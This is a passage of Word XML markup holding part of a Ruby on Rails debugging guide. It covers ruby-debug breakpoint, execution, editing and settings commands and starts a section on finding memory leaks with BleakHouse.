          <w:p w14:paraId="5243B0EA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:5) delete 1</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="09E6EFFB" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>(rdb:5) info breakpoints</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7B912408" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>No breakpoints.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="11946319" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>You can also enable or disable breakpoints:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="04AA66CA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="349"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>enable breakpoints</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: allow a list </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>breakpoints</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> or all of them if no list is specified, to stop your program. This is the default state when you create a breakpoint.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18360969" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="349"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>disable breakpoints</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>breakpoints</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> will have no effect on your program.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C13B332" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.8 Catching Exceptions</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4ACE6BE4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The command </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>catch exception-name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (or just </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>cat exception-name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">) can be used to intercept an exception of type </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>exception-name</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> when there would otherwise be is no handler for it.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C0DE4DD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To list all active catchpoints use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>catch</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C11E6B9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.9 Resuming Execution</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="05CD2B8A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>There are two ways to resume execution of an application that is stopped in the debugger:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B0C0901" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="350"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>continue</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> [line-specification] (or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:t>): resume program execution, at the address where your script last stopped; any breakpoints set at that address are bypassed. The optional argument line-specification allows you to specify a line number to set a one-time breakpoint which is deleted when that breakpoint is reached.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07C223DD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="350"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>finish</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> [frame-number] (or </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>fin</w:t>
      </w:r>
      <w:r>
        <w:t>): execute until the selected stack frame returns. If no frame number is given, the application will run until the currently selected frame returns. The currently selected frame starts out the most-recent frame or 0 if no frame positioning (e.g up, down or frame) has been performed. If a frame number is given it will run until the specified frame returns.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3DE6871D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.10 Editing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FDA355B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Two commands allow you to open code from the debugger into an editor:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="013DCB64" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="351"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>edit [file:line]</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: edit </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>file</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> using the editor specified by the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>EDITOR</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> environment variable. A specific </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>line</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> can also be given.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3AB05AF3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="351"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>tmate _n_</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (abbreviated </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>tm</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">): open the current file in TextMate. It uses n-th frame if </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is specified.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A9DE8C8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.11 Quitting</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36F8110E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">To exit the debugger, use the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>quit</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command (abbreviated </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>q</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">), or its alias </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>exit</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="65B31C1A" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>A simple quit tries to terminate all threads in effect. Therefore your server will be stopped and you will have to start it again.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2349FF5E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>3.12 Settings</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="68D67E88" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>There are some settings that can be configured in ruby-debug to make it easier to debug your code. Here are a few of the available options:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07C108E4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="352"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>set reload</w:t>
      </w:r>
      <w:r>
        <w:t>: Reload source code when changed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="137ED25F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="352"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>set autolist</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Execute </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>list</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command on every breakpoint.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="03593B31" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="352"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>set listsize _n_</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Set number of source lines to list by default to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11406E84" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="352"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>set forcestep</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">: Make sure the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>next</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>step</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> commands always move to a new line</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6FDC7BC4" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can see the full list by using </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>help set</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. Use </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>help set _subcommand_</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to learn about a particular </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>set</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="788508C8" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">You can include any number of these configuration lines inside a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.rdebugrc</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file in your </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="caps"/>
        </w:rPr>
        <w:t>HOME</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> directory. ruby-debug will read this file every time it is loaded and configure itself accordingly.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22AEE728" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Here’s a good start for an </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>.rdebugrc</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="1800"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="27256195" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="2AE69ECF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>set autolist</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6C67244B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>set forcestep</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4BE83AD2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>set listsize 25</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="601D5C0E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>4 Debugging Memory Leaks</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61617780" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>A Ruby application (on Rails or not), can leak memory – either in the Ruby code or at the C code level.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73325159" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>In this section, you will learn how to find and fix such leaks by using tools such as BleakHouse and Valgrind.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C67BA17" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t>4.1 BleakHouse</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="625B00CF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:hyperlink r:id="rId783" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t>BleakHouse</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidR="009A002D">
        <w:t xml:space="preserve"> is a library for finding memory leaks.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="583AFA29" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>If a Ruby object does not go out of scope, the Ruby Garbage Collector won’t sweep it since it is referenced somewhere. Leaks like this can grow slowly and your application will consume more and more memory, gradually affecting the overall system performance. This tool will help you find leaks on the Ruby heap.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="699BE57D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>To install it run:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3600"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="04BAD033" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="1CBFCA26" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1514613557"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ sudo gem install bleak_house</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="0DD1F771" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Then setup your application for profiling. Then add the following at the bottom of config/environment.rb:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="5015"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="0254A824" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B0E6565" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1526752148"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'bleak_house'</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ENV['BLEAK_HOUSE']</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="04C31565" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Start a server instance with BleakHouse integration:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="7920"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="030867A8" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="4B186C88" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D">
            <w:pPr>
              <w:divId w:val="1597515623"/>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>$ RAILS_ENV=production BLEAK_HOUSE=1 ruby-bleak-house rails server</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="747D3C72" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Make sure to run a couple hundred requests to get better data samples, then press </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>CTRL-C</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. The server will stop and Bleak House will produce a dumpfile in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>/tmp</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
